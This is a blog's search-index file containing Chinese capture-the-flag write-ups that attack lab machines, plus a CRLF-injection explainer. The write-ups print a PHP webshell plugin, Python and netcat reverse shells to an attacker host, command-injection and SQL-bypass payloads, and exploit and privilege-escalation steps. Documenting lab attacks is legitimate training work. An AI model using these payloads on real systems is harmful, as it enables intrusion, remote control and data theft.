<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>AdmX_new</title>
    <url>/2022/11/05/AdmX-new/</url>
    <content><![CDATA[<p><strong>0x01 主机发现</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -sn 10.0.2.0/24</span><br></pre></td></tr></table></figure>

<img src="/2022/11/05/AdmX-new/01.png" class title="This is an example image">

<p>前 1-4 为虚拟机占用的IP，靶机IP为 10.0.2.7</p>
<p><strong>0x02 端口扫描</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 10.0.2.7</span><br></pre></td></tr></table></figure>

<img src="/2022/11/05/AdmX-new/02.png" class title="This is an example image">



<p><strong>0x03 服务识别</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nmap -p80 -sV 10.0.2.7</span><br></pre></td></tr></table></figure>

<img src="/2022/11/05/AdmX-new/03.png" class title="This is an example image">



<p><strong>0x04 web服务探测</strong></p>
<p>靶机只开放了 80 端口，尝试访问</p>
<img src="/2022/11/05/AdmX-new/04.png" class title="This is an example image">

<p>尝试路径爆破（使用 feroxbuster 或 dirsearch 都可以 ，字典使用的 kali 内置）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">feroxbuster --url http://10.0.2.7 -w /usr/share/dirb/wordlists/common.txt</span><br></pre></td></tr></table></figure>

<p>扫描结果，出现了很多 wordpress 字样，可以判断网站用的 wordpress 框架</p>
<img src="/2022/11/05/AdmX-new/06.png" class title="This is an example image">



<p>访问登录页面，可以看到页面持续加载</p>
<img src="/2022/11/05/AdmX-new/07.png" class title="This is an example image">



<p>抓个包看看</p>
<img src="/2022/11/05/AdmX-new/09.png" class title="This is an example image">



<p>可以看到在第一个请求的响应体里有多个 192.168.159.145 地址，下面的请求都是从第一个请求的响应体里发出，但由于请求不成功才导致页面的卡顿。尝试让页面加载时的请求全部指向本机。配置如下：</p>
<img src="/2022/11/05/AdmX-new/10.png" class title="This is an example image">



<p>类似于访问国外网站失败，重定向到国内镜像网站。也可用浏览器插件 Redirector  实现重定向。</p>
<p>burp 中配置的 Response header &amp; Response body。</p>
<p>现在再访问试试，正常显示。</p>
<img src="/2022/11/05/AdmX-new/11.png" class title="This is an example image">



<p><strong>0x05 暴力破解 &amp; 后台命令执行</strong></p>
<p>尝试默认账号密码登录，失败了，但确定有 admin 账户。</p>
<img src="/2022/11/05/AdmX-new/12.png" class title="This is an example image">



<p>尝试密码爆破，这时候就看字典强大与否了，毕竟wp的漏洞利用基本都要登录后台。其实这里也可以使用 kali 自带的 wpscan，但需要代理请求，设置IP转发，所以暂时先没用，试试能不能爆破出来密码。</p>
<img src="/2022/11/05/AdmX-new/13.png" class title="This is an example image">



<p>成功登录后台，Wordpress Version 5.7.1</p>
<img src="/2022/11/05/AdmX-new/14.png" class title="This is an example image">



<p>后台 getshell | 命令注入的思路一般为：<br>1、Mdedia——上传软件包<br>2、Appearance——编辑页面主题 例如：404Template.php，插入恶意代码<br>3、Plugins——上传自定义恶意插件，压缩成zip、 激活插件</p>
<p>操作上，自定义插件是最灵活的。创建 exp.php 文件，代码如下，格式必须固定：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Plugin Name: WebShell</span></span><br><span class="line"><span class="comment">Plugin URI: https://yunju.blog.csdn.net/</span></span><br><span class="line"><span class="comment">Description: mu</span></span><br><span class="line"><span class="comment">Author: myname</span></span><br><span class="line"><span class="comment">Version: 1.0</span></span><br><span class="line"><span class="comment">Author URI: https://yunju.blog.csdn.net/</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>压缩成 zip 格式才能上传，上传后记得激活才能生效</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">zip exp.zip exp.php</span><br></pre></td></tr></table></figure>

<p>访问插件路径（建议下载目标框架源码看看各种对外路径）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.0.2.7/wordpress/wp-content/plugins/exp.php?cmd=id</span><br></pre></td></tr></table></figure>

<img src="/2022/11/05/AdmX-new/15.png" class title="This is an example image">



<p>能够执行命令后，收集环境信息，如果能够直接执行 php 或是 python 那就反弹 shell ，如果有长度限制的话就反弹个 nc。查找命令可以看到有 Python3 环境。 </p>
<img src="/2022/11/05/AdmX-new/16.png" class title="This is an example image">



<p>执行 pyhton 反弹 shell 命令：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import os,subprocess,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.2.4&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>

<img src="/2022/11/05/AdmX-new/17.png" class title="This is an example image">



<p><strong>0x06 一次提权</strong></p>
<p>可以看到当前为普通权限，由于当前没有bash权限，也执行不了sudo查看是否有配置不当。先查看内核信息，无提权可用</p>
<img src="/2022/11/05/AdmX-new/18.png" class title="This is an example image">



<p>WP 框架要记得去看配置信息，wp-config.php</p>
<img src="/2022/11/05/AdmX-new/19.png" class title="This is an example image">



<p>查看当前系统有什么账户</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls /home</span><br></pre></td></tr></table></figure>

<img src="/2022/11/05/AdmX-new/20.png" class title="This is an example image">



<p>可以直接知道 MySQL 用户 <code>admin</code> 和密码 <code>Wp_Admin#123</code>，但登录数据库报错。切换用户也报错。试了下之前登录的密码 adam14，成功切换到 wpadmin 账户。</p>
<img src="/2022/11/05/AdmX-new/21.png" class title="This is an example image">



<p>在 &#x2F;home&#x2F;wpadmin 下拿到了第一个flag</p>
<img src="/2022/11/05/AdmX-new/22.png" class title="This is an example image">



<p><strong>0x07 二次提权</strong></p>
<p>执行 sudo -l </p>
<img src="/2022/11/05/AdmX-new/23.png" class title="This is an example image">

<p>可使用 root 用户 执行 mysql 操作，而 mysql 中是有 system这个函数的，由于之前尝试 WP 配置文件中的密码错误，那么就再尝试一开始的登录密码 adam14，提权步骤如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1、sudo /usr/bin/mysql -u root -D wordpress -p #密码adam14</span><br><span class="line">2、\! /bin/bash #切换到 root 权限的命令行</span><br></pre></td></tr></table></figure>

<p>读取 root 目录下的 flag</p>
<img src="/2022/11/05/AdmX-new/24.png" class title="This is an example image">



<p><strong>0x08 出现的意外及注意点</strong></p>
<p>1、不知为何，我这边的反弹 shell 都是不带用户名的，因此命令执行是否成功也不知道，就像这样。</p>
<img src="/2022/11/05/AdmX-new/25.png" class title="This is an example image">

<p>2、通常遇到 wordpress 框架，首先识别版本号，但由于此目标网站下的识别文件已移除，无法直接地识别。另一方面就是采用 wpscan 进行扫描，由访问有问题就没有直接使用了。</p>
<p>3、应该维持多个权限，通过某一处命令执行后，通常会多点上线，比如上线 CS 、MSF、定时任务反弹、写入恶意 DLL等。这里其实也可以直接使用 MSF 上线的。</p>
]]></content>
      <categories>
        <category>红队</category>
      </categories>
      <tags>
        <tag>打靶</tag>
      </tags>
  </entry>
  <entry>
    <title>BOREDHACKERBLOG: CLOUD AV</title>
    <url>/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/</url>
    <content><![CDATA[<p><strong>0x01 主机发现</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for i in $(seq 1 254); do sudo arping -c 2 10.0.2.$i; done</span><br></pre></td></tr></table></figure>

<img src="/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/01.png" class title="This is an example image">



<p><strong>0x02 端口扫描</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 10.0.2.5</span><br></pre></td></tr></table></figure>

<img src="/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/02.png" class title="This is an example image">



<p><strong>0x03 服务识别</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,8080 -sV 10.0.2.5</span><br></pre></td></tr></table></figure>

<img src="/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/03.png" class title="This is an example image">



<p><strong>0x04 堆叠注入</strong></p>
<p>访问Web服务瞧瞧</p>
<img src="/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/04.png" class title="This is an example image">



<p>有输入框，挂BP抓个包看看</p>
<img src="/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/05.png" class title="This is an example image">



<p>基本全明文，那把参数替换成特殊字符试试，把键盘上所有的特殊字符做成字典，过一遍看有无报错</p>
<img src="/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/06.png" class title="This is an example image">



<p>看到报错信息了，在页面上注入查看详细信息。</p>
<img src="/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/07.png" class title="This is an example image">



<p>看到报错信息，是sqlite数据库，连数据库语句都报出来了。</p>
<p>尝试万能密码绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot; or 1=1--</span><br></pre></td></tr></table></figure>

<img src="/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/08.png" class title="This is an example image">



<p>猜测功能为输入文件名，调用杀毒程序进行查杀。</p>
<p>系统应该是执行    avscan fileName  类似的命令，尝试堆叠注入。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hello | id</span><br></pre></td></tr></table></figure>

<img src="/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/09.png" class title="This is an example image">



<p>堆叠注入成功，代表此处存在命令注入。</p>
<p>由上面的服务发现可知，系统存在python2环境，此处可以用Python代码执行反弹shell，但考虑到代码过长，选择另一种更为常见的方式，<strong>nc反弹shell</strong>。</p>
<p>nc常用在反弹shell，它既可以主动发起连接，也可以被动等待连接，常用命令：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">主动发起连接,-e参数是指连接交予sh</span></span><br><span class="line">nc ip 4444 -e /bin/sh</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">被动接受连接</span></span><br><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure>

<p>这里有个需要注意的地方，不同发行版的Linux用的是不同版本的nc，部分nc没有-e参数，不指定权限交予程序。</p>
<p>先尝试用带 e 的命令行注入，无连接反应。</p>
<img src="/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/10.png" class title="This is an example image">

<p>这里介绍一种新思路：</p>
<p>1、受害机通过nc建立一个普通连接<br>2、把第一个连接的输入重定向到受害者本地的&#x2F;bin&#x2F;bash<br>3、把&#x2F;bin&#x2F;bash的输入重定向到另一个nc连接</p>
<p>首先，本地开启两个Nc端口监听</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">第一个Nc监听，用于执行命令</span></span><br><span class="line">nc -nvlp 3333</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">第二个Nc监听，用于输入执行结果</span></span><br><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure>

<p>受害机执行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">hello为堆叠注入，</span></span><br><span class="line">hello | nc 10.0.2.4 3333 | /bin/bash | nc 10.0.2.4 4444</span><br></pre></td></tr></table></figure>

<p>得到反弹shell，3333端口用于命令输入，4444端口用于结果输出。</p>
<img src="/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/11.png" class title="This is an example image">



<p><strong>0x05 SSH爆破尝试</strong></p>
<p>进行信息收集，看到database.sql文件。</p>
<img src="/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/12.png" class title="This is an example image">

<p>由先前报错可知，采用的是sqlite数据库，转了一圈发现本地没有sqlite环境读取，则把文件下载到本地来读取。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">nc进行文件传输</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">kali进行nc端口监听</span></span><br><span class="line">nc ip 5555 &gt; db.sql</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">目标机进行nc数据传输</span></span><br><span class="line">nc ip 5555 &lt; database.sql</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 本地读取sqlite文件</span><br><span class="line">sqlite3</span><br><span class="line">.open db.sql</span><br><span class="line">.database</span><br><span class="line">.dump</span><br></pre></td></tr></table></figure>

<img src="/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/13.png" class title="This is an example image">

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">读取当前系统有bash权限的用户</span></span><br><span class="line">cat /etc/passwd | grep /bin/bash</span><br></pre></td></tr></table></figure>

<p>得到 cloudav &amp; scanner。</p>
<p>制作字典尝试爆破SSH。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi user.txt      # cloudav | scanner</span><br><span class="line">vi password.txt  # myinvitecode123 | mysecondinvitecode | cloudavtech | mostsecurescanner</span><br><span class="line">hydra -L user.txt - P pass.txt ssh://ip</span><br></pre></td></tr></table></figure>

<p>结果全部错误，木大。</p>
<p><strong>0x06 命令行提权</strong></p>
<p>直接在反弹shell尝试提权吧。</p>
<p>兜兜转转一圈下来，没发现啥内核提权漏洞。只有用于搭建网站的前后端文件、数据库文件。</p>
<p>这时，习惯用 ls -l 命令的我发现了疑点</p>
<img src="/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/14.png" class title="This is an example image">



<p>在上个目录下发现了suid属性的文件，所属是root用户，并且其他组用户还有执行权限。</p>
<p><strong>如果用 root 所属的文件创建新的连接，那就是一个root权限的连接。</strong></p>
<p>刚好有个.c的源文件，看看这个文件是干嘛的</p>
<img src="/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/15.png" class title="This is an example image">



<p>简单来讲就是，执行软件更新命令，那就涉及命令执行，尝试下最开始的堆叠注入吧。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./update_cloudav &quot;id | nc 10.0.2.4 6666 | /bin/bash | nc 10.0.2.4 7777&quot;</span><br></pre></td></tr></table></figure>

<img src="/2022/10/23/BOREDHACKERBLOG-CLOUD-AV/16.png" class title="This is an example image">

<p>拿到 root 权限了。</p>
]]></content>
      <categories>
        <category>红队</category>
      </categories>
      <tags>
        <tag>打靶</tag>
      </tags>
  </entry>
  <entry>
    <title>BoredHackerBlog: Social Network</title>
    <url>/2022/10/17/BoredHackerBlog-Social-Network/</url>
    <content><![CDATA[<p><strong>0x01 主机发现</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">同一网段的二层主机地址发现</span></span><br><span class="line">sudo arp-scan -l</span><br></pre></td></tr></table></figure>

<img src="/2022/10/17/BoredHackerBlog-Social-Network/arp-scan.png" class title="This is an example image">



<p><strong>0x02 端口扫描</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 10.0.2.15</span><br></pre></td></tr></table></figure>

<img src="/2022/10/17/BoredHackerBlog-Social-Network/nmap.png" class title="This is an example image">



<p><strong>0x03 服务发现</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,5000 -sV 10.0.2.15</span><br></pre></td></tr></table></figure>

<img src="/2022/10/17/BoredHackerBlog-Social-Network/nmap-service.png" class title="This is an example image">



<p><strong>0x04 Web页面探查</strong></p>
<img src="/2022/10/17/BoredHackerBlog-Social-Network/main-page.png" class title="This is an example image">

<p>在线留言板，估计应该是通过js实现的数据添加</p>
<p><strong>0x05 路径爬取</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dirsearch -u 10.0.2.15</span><br></pre></td></tr></table></figure>

<img src="/2022/10/17/BoredHackerBlog-Social-Network/route-brust.png" class title="This is an example image">



<p><strong>0x06 代码注入-反弹shell</strong></p>
<img src="/2022/10/17/BoredHackerBlog-Social-Network/admin-page.png" class title="This is an example image">

<p>从前面可知目标机环境为python，因为无回显 ，直接使用反弹shell试试</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#在页面输入</span></span><br><span class="line"><span class="keyword">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;10.0.2.4&quot;</span>,<span class="number">4444</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>); os.dup2(s.fileno(),<span class="number">2</span>);p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">本地开启监听</span></span><br><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure>

<img src="/2022/10/17/BoredHackerBlog-Social-Network/shell.png" class title="This is an example image">



<p><strong>0x07 内网信息收集</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat Dockerfile</span><br></pre></td></tr></table></figure>

<img src="/2022/10/17/BoredHackerBlog-Social-Network/ls-docker.png" class title="This is an example image">

<p>初步确定为一台docker容器，可运行下面的命令进一步确定</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls /.dockerenv</span><br><span class="line">cat /proc/1/cgroup   #包含docker</span><br></pre></td></tr></table></figure>



<p><strong>0x08 内网穿透</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ip a #查看ip地址</span><br></pre></td></tr></table></figure>

<img src="/2022/10/17/BoredHackerBlog-Social-Network/ip-a.png" class title="This is an example image">

<p>发现有内网网段思路有很多，列举几种比较常见的：</p>
<ul>
<li>上线msf、生成python二进制打包elf，或是直接生成elf可执行程序</li>
<li>上线CS，linux上线CS下次再介绍</li>
</ul>
<p>由于这里是打靶，不会过于复杂，就写个简单的脚本扫描了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for i in $(seq 1 10); do ping -c 1 172.17.0.$i; done #这里省时就扫少点</span><br></pre></td></tr></table></figure>

<img src="/2022/10/17/BoredHackerBlog-Social-Network/ping.png" class title="This is an example image">



<p><strong>Venom实现内网穿透：</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./admin_linux_x64 -lport 9999  #kali:服务器端</span><br></pre></td></tr></table></figure>

<img src="/2022/10/17/BoredHackerBlog-Social-Network/vemon_server.png" class title="This is an example image">



<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python3 -m http.server <span class="number">80</span>  <span class="comment">#开启http服务</span></span><br><span class="line">wget http://<span class="number">10.0</span><span class="number">.2</span><span class="number">.4</span>/agent_linux_x64  <span class="comment">#目标机下载客户端程序</span></span><br><span class="line">chmod -x agent_linux_x64  <span class="comment">#赋予可执行权限</span></span><br><span class="line">./agent_linux_x64 -rhost <span class="number">10.0</span><span class="number">.2</span><span class="number">.4</span> -rport <span class="number">9999</span> </span><br></pre></td></tr></table></figure>



<p><strong>Venom本机代理设置:</strong> </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">show</span><br><span class="line">goto 1</span><br><span class="line">socks 1080   #启动kali本地的socks代理</span><br></pre></td></tr></table></figure>

<img src="/2022/10/17/BoredHackerBlog-Social-Network/vemon_socket.png" class title="This is an example image">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vi /etc/proxychains4.conf</span><br><span class="line">socks5 127.0.0.1 1080</span><br></pre></td></tr></table></figure>

<img src="/2022/10/17/BoredHackerBlog-Social-Network/proxychains.png" class title="This is an example image">



<p>完成设置后，就能使用kali本机的工具直接对内网主机进行操作，只需在前缀加上<strong>proxychains</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">proxychains nmap -Pn -sT 172.17.0.1</span><br></pre></td></tr></table></figure>

<img src="/2022/10/17/BoredHackerBlog-Social-Network/1_nmap_port.png" class title="This is an example image">



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">proxychains nmap -p22,5000 -Pn -sT -sV 172.17.0.1</span><br></pre></td></tr></table></figure>

<img src="/2022/10/17/BoredHackerBlog-Social-Network/1_nmap_service.png" class title="This is an example image">



<p>端口服务跟暴露在外网的一样<br>通过配置服务器代理后可直接访问内网地址172.17.0.1</p>
<img src="/2022/10/17/BoredHackerBlog-Social-Network/browser_proxy.png" class title="This is an example image">



<p>可以看出这个内网地址跟暴露在外网的10.0.2.15开启了相同的服务，判断为同一服务</p>
<img src="/2022/10/17/BoredHackerBlog-Social-Network/1_main_page.png" class title="This is an example image">



<p>继续第二个内网IP</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">proxychains nmap -Pn -sT 172.17.0.2</span><br></pre></td></tr></table></figure>

<img src="/2022/10/17/BoredHackerBlog-Social-Network/2_nmap_port.png" class title="This is an example image">

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">proxychains nmap -Pn -sT -p 9200 172.17.0.2</span><br></pre></td></tr></table></figure>

<img src="/2022/10/17/BoredHackerBlog-Social-Network/2_nmap_service.png" class title="This is an example image">



<p><strong>0x09 ES漏洞利用</strong></p>
<p>本地寻找漏洞库中的利用代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit Elasticsearch</span><br></pre></td></tr></table></figure>

<img src="/2022/10/17/BoredHackerBlog-Social-Network/searchsploit_Elasticsearch.png" class title="This is an example image">

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/remote/36337.py .</span><br><span class="line">proxychains python2 36337.py 172.17.0.2</span><br></pre></td></tr></table></figure>

<img src="/2022/10/17/BoredHackerBlog-Social-Network/2_getshell.png" class title="This is an example image">



<p>oh yes ！再拿到一个shell，再来一波信息收集，看到有个password进去瞧瞧。</p>
<img src="/2022/10/17/BoredHackerBlog-Social-Network/password.png" class title="This is an example image">



<p>拿去解密，得到 john 密码。PS : 其他账号没什么用。</p>
<img src="/2022/10/17/BoredHackerBlog-Social-Network/md5.png" class title="This is an example image">



<p><strong>0x10 本地提权</strong></p>
<p>尝试远程登录服务器，只有 john 用户登得上外网的服务器。</p>
<img src="/2022/10/17/BoredHackerBlog-Social-Network/ssh.png" class title="This is an example image">



<p>不是root权限，查看内核版本为3.13.0-24-generic，这个是比较古老的版本。查找EXP。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit 3.13</span><br></pre></td></tr></table></figure>

<img src="/2022/10/17/BoredHackerBlog-Social-Network/linux_kernel.png" class title="This is an example image">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/remote/37292.c .</span><br></pre></td></tr></table></figure>

<p>此处有个坑，查看提权脚本</p>
<img src="/2022/10/17/BoredHackerBlog-Social-Network/code.png" class title="This is an example image">

<p>常规做法是编译成可执行文件到目标机上执行，但代码里有继续调用本地库的操作，很显然，基本上目标机上是没有这些库的，所以在这里的思路是，稍稍修改下代码，再把对应库文件上传。</p>
<p>操作如下：<br>1、把脚本里对ofs-lib.c操作和判断删除<br>2、把ofs-lib.c和脚本文件上传到目标机完成提权</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -o exp 37292.c</span><br></pre></td></tr></table></figure>

<p>找到本地的ofs-lib.so文件跟 exp 文件一起上传到目标机</p>
<img src="/2022/10/17/BoredHackerBlog-Social-Network/ofs-lib.png" class title="This is an example image">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#目标机赋执行权限，完成提权</span><br><span class="line">chmod +x exp</span><br><span class="line">./exp</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>红队</category>
      </categories>
      <tags>
        <tag>打靶</tag>
      </tags>
  </entry>
  <entry>
    <title>CRLF注入漏洞</title>
    <url>/2022/09/03/CRLF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p><strong>0x01 CRLF注入漏洞</strong></p>
<p>回车换行（CRLF）注入攻击是一种当用户将CRLF字符插入到应用中而触发漏洞的攻击技巧。CRLF字符（%0d%0a）在许多互联网协议中表示行的结束，包括HTML，该字符解码后即为\ r\ n。这些字符可以被用来表示换行符，并且当该字符与HTTP协议请求和响应的头部一起联用时就有可能会出现各种各样的漏洞，包括http请求走私（HTTP RequestSmuggling）和http响应拆分（HTTP Response Splitting）。</p>
<p>一般有两种应用场景：</p>
<p>1、注入请求头导致html解析</p>
<p>2、注入操作日志导致后台日志记录混淆，比如恶意换行</p>
<p><strong>0x02 CRLF注入检测原理</strong></p>
<p>简单来讲就是在构造请求时，加上%0d%0a字符，验证后续代码能否被单独解析执行，如下测试代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET url=https://www.test.com%0d%0a%0d%0a&lt;img src=1 onerror=alert(/xss/)&gt;/</span><br><span class="line">Host:xxx</span><br></pre></td></tr></table></figure>

<p>如果存在CRLF注入漏洞会被解析为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET url=https://www.test.com</span><br><span class="line">&lt;img src=1 onerror=alert(/xss/)&gt;/</span><br><span class="line">Host:xxx</span><br></pre></td></tr></table></figure>

<p>从而造成XSS</p>
<p><strong>0x03 CRLF注入自动化检测</strong></p>
<p>自动化检测工具地址：<a href="https://github.com/Nefcore/CRLFsuite">https://github.com/Nefcore/CRLFsuite</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ git clone https://github.com/Nefcore/CRLFsuite.git</span><br><span class="line">$ cd CRLFsuite</span><br><span class="line">$ sudo python3 setup.py install</span><br><span class="line">$ crlfsuite -h</span><br></pre></td></tr></table></figure>

<p>用法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">单网址扫描：</span><br><span class="line">$ crlfsuite -u &quot;http://testphp.vulnweb.com&quot;</span><br><span class="line"></span><br><span class="line">多个 URL 扫描：：</span><br><span class="line">$ crlfsuite -i targets.txt</span><br><span class="line"></span><br><span class="line">从标准输入：</span><br><span class="line">$ subfinder -d google.com -silent | httpx -silent | crlfsuite -s</span><br><span class="line"></span><br><span class="line">指定 cookie扫描：</span><br><span class="line">$ crlfsuite -u &quot;http://testphp.vulnweb.com&quot; --cookies &quot;key=val; newkey=newval&quot;</span><br><span class="line"></span><br><span class="line">使用 POST 方法：	</span><br><span class="line">$ crlfsuite -i targets.txt -m POST -d &quot;key=val&amp;newkey=newval&quot;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>红队</category>
      </categories>
      <tags>
        <tag>常用渗透点</tag>
      </tags>
  </entry>
  <entry>
    <title>CHRONOS</title>
    <url>/2022/10/29/CHRONOS/</url>
    <content><![CDATA[<p><strong>0x01 主机发现</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#建议在实际子网掩码减8</span></span><br><span class="line">sudo netdiscover -r 10.0.2.0/16  </span><br></pre></td></tr></table></figure>

<img src="/2022/10/29/CHRONOS/01.png" class title="This is an example image">



<p><strong>0x02 端口扫描</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 10.0.2.6</span><br></pre></td></tr></table></figure>

<img src="/2022/10/29/CHRONOS/02.png" class title="This is an example image">



<p><strong>0x03 服务识别</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,80,8000 -sV 10.0.2.6</span><br></pre></td></tr></table></figure>

<img src="/2022/10/29/CHRONOS/03.png" class title="This is an example image">



<p><strong>0x04 Web页面探查</strong></p>
<img src="/2022/10/29/CHRONOS/04.png" class title="This is an example image">

<p>针对Web页面通常有两种思路：</p>
<p>1、爆破路径</p>
<p>此处爆破无果，不是403就是301，也许是自带的字典不够强大吧。</p>
<p>2、查看源码</p>
<p>右键查看网页源码，发现 js 脚本有点猫腻。</p>
<img src="/2022/10/29/CHRONOS/06.png" class title="This is an example image">

<p>此处80和8000端口的源码是一样的，猜想是 js 搞的鬼，这里js代码被混淆了用在线网站格式化查看</p>
<p>推荐使用 cyberchef，效果如下</p>
<img src="/2022/10/29/CHRONOS/07.png" class title="This is an example image">

<p>可以看到 js 中有个地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://chronos.local:8000/date?format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL</span><br></pre></td></tr></table></figure>



<p><strong>0x05 编码&amp;命令注入</strong></p>
<p>抓个包看看：</p>
<img src="/2022/10/29/CHRONOS/08.png" class title="This is an example image">

<p>可以看到，页面发出了两个请求，其中一个域名解析失败，而目标机的8000端口是开放的，猜测此处的域名解析IP应该为目标机本机，那么就试试配置本地的hosts，让整个域名指向目标机。</p>
<img src="/2022/10/29/CHRONOS/09.png" class title="This is an example image">

<p>重新访问页面，请求加载成功</p>
<img src="/2022/10/29/CHRONOS/10.png" class title="This is an example image">

